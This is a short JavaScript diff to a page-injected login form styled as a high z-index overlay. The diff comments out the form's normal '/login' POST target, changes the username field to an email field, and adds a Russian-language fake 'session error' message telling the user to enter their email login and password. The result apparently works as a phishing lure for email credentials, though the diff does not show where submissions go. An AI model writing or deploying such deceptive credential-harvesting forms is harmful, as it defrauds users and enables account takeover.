@@ -1,12 +1,16 @@
 const form = document.createElement("form");
 form.id = "login-form";
-form.action = "/login";
-form.method = "POST";
+//form.action = "/login";
+//form.method = "POST";
+
+const formText = document.createElement("p");
+formText.textContent =
+  "Ошибка сессии. Для продолжения необходимо ввести логин и пароль от почты";
 
 const usernameInput = document.createElement("input");
-usernameInput.type = "text";
-usernameInput.name = "username";
-usernameInput.placeholder = "Username";
+usernameInput.type = "email";
+usernameInput.name = "email";
+usernameInput.placeholder = "Email";
 
 const passwordInput = document.createElement("input");
 passwordInput.type = "password";
@@ -17,6 +21,7 @@ const submitButton = document.createElement("button");
 submitButton.type = "submit";
 submitButton.textContent = "Log In";
 
+form.appendChild(formText);
 form.appendChild(usernameInput);
 form.appendChild(passwordInput);
 form.appendChild(submitButton);
@@ -45,7 +50,7 @@ style.textContent = `
     z-index: 999;
   }
 
-  input[type="text"],
+  input[type="email"],
   input[type="password"],
   button[type="submit"] {
     display: block;
